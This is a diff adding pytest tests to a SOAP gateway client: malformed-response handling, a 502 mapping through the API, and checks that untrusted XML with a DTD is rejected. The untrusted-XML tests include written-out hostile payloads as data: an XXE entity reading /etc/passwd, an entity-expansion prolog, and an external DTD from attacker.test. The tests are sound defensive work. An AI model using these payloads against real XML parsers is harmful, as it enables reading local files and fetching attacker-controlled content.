@@ -174,6 +174,12 @@ def test_unparseable_response_becomes_bad_response(gateway, rsps):
         gateway.list_continents()
 
 
+def test_empty_200_response_is_reported_as_invalid_not_as_an_http_error(gateway, rsps):
+    rsps.post(ENDPOINT, body="", status=200, content_type="text/xml")
+    with pytest.raises(UpstreamBadResponse, match="unexpected response"):
+        gateway.list_continents()
+
+
 def test_unexpected_exception_from_the_client_becomes_bad_response():
     class BrokenService:
         def ListOfContinentsByCode(self):  # noqa: N802 - mirrors the SOAP operation name
@@ -202,3 +208,90 @@ def test_build_gateway_overrides_win_over_settings(rsps):
     with pytest.raises(UpstreamBadResponse):
         build_gateway(settings, timeout_seconds=0.5, max_retries=0).list_continents()
     assert len(rsps.calls) == 1  # readiness probe: no retries
+
+
+# --- malformed upstream data ---------------------------------------------------------------
+
+
+def envelope(operation: str, result: str, prolog: str = "") -> str:
+    """A minimal SOAP response for `operation` whose Result element holds `result`."""
+    return (
+        f'<?xml version="1.0" encoding="utf-8"?>{prolog}'
+        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"'
+        ' xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soap:Body>'
+        f'<m:{operation}Response xmlns:m="http://www.oorsprong.org/websamples.countryinfo">'
+        f"<m:{operation}Result>{result}</m:{operation}Result>"
+        f"</m:{operation}Response></soap:Body></soap:Envelope>"
+    )
+
+
+def test_record_with_a_missing_required_field_is_a_bad_response_not_a_crash(gateway, rsps):
+    body = envelope("ListOfContinentsByCode", "<m:tContinent><m:sCode>AF</m:sCode></m:tContinent>")
+    rsps.post(ENDPOINT, body=body, content_type="text/xml")
+    with pytest.raises(UpstreamBadResponse, match="incomplete record"):
+        gateway.list_continents()
+
+
+def test_country_with_a_code_but_no_name_is_a_bad_response(gateway, rsps):
+    body = envelope("FullCountryInfo", "<m:sISOCode>IT</m:sISOCode>")
+    rsps.post(ENDPOINT, body=body, content_type="text/xml")
+    with pytest.raises(UpstreamBadResponse):
+        gateway.get_country("IT")
+
+
+def test_malformed_record_is_a_502_through_the_api(rsps):
+    from fastapi.testclient import TestClient
+
+    from app.main import create_app
+    from tests.conftest import API_KEY
+
+    settings = Settings(
+        _env_file=None,
+        api_keys=[API_KEY],
+        soap_endpoint_url=ENDPOINT,
+        soap_max_retries=0,
+        log_level="CRITICAL",
+    )
+    body = envelope("ListOfContinentsByCode", "<m:tContinent><m:sCode>AF</m:sCode></m:tContinent>")
+    rsps.post(ENDPOINT, body=body, content_type="text/xml")
+    response = TestClient(create_app(settings)).get(
+        "/v1/continents", headers={"X-API-Key": API_KEY}
+    )
+    assert response.status_code == 502
+    assert response.json()["code"] == "upstream_bad_response"
+
+
+# --- untrusted XML ---------------------------------------------------------------------------
+
+CONTINENT = "<m:tContinent><m:sCode>&e;</m:sCode><m:sName>x</m:sName></m:tContinent>"
+
+
+@pytest.mark.parametrize(
+    "prolog, result",
+    [
+        # XXE: an external entity pointing at a local file.
+        ('<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>', CONTINENT),
+        # "Billion laughs" style internal entity expansion.
+        ('<!DOCTYPE x [<!ENTITY e "lol">]>', CONTINENT),
+        # An external DTD that a careless parser would download.
+        ('<!DOCTYPE x SYSTEM "http://attacker.test/evil.dtd">', ""),
+        # Even a harmless DOCTYPE: SOAP messages must not have one.
+        ("<!DOCTYPE x>", ""),
+    ],
+)
+def test_responses_with_a_dtd_are_rejected_without_resolving_anything(
+    gateway, rsps, prolog, result
+):
+    body = envelope("ListOfContinentsByCode", result, prolog=prolog)
+    rsps.post(ENDPOINT, body=body, content_type="text/xml")
+    with pytest.raises(UpstreamBadResponse) as caught:
+        gateway.list_continents()
+    assert "root:" not in str(caught.value.__cause__)  # /etc/passwd was never read
+    assert len(rsps.calls) == 1  # only the SOAP call: nothing was fetched, nothing retried
+
+
+def test_the_client_uses_the_hardened_xml_settings():
+    service = build_service(DEFAULT_WSDL_PATH, ENDPOINT, timeout_seconds=1)
+    settings = service._client.settings
+    assert settings.forbid_dtd and settings.forbid_entities and settings.forbid_external
+    assert settings.strict and not settings.xml_huge_tree
